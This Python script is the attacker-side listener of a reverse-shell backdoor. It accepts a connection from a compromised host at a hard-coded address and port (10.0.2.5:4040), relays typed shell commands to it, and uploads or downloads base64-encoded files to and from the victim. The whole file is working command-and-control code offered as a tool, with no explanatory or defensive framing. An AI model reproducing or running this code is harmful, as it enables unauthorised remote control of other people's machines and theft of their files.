#!/usr/bin/python
import socket,json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("\n[+]Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("\n[+]Connection got established with " + str(address))

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode()) #converts into byte

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_remotly(self,command):

        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        print("Downloading....")
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            if command[0] == "upload":
                file_content = self.read_file(command[1]).decode()
                command.append(file_content)

            output = self.execute_remotly(command)

            if command[0] == "download" and "[-] Error" not in output:
                output = self.write_file(command[1],output)

            print(output)


my_listener = Listener("10.0.2.5", 4040)
my_listener.run()
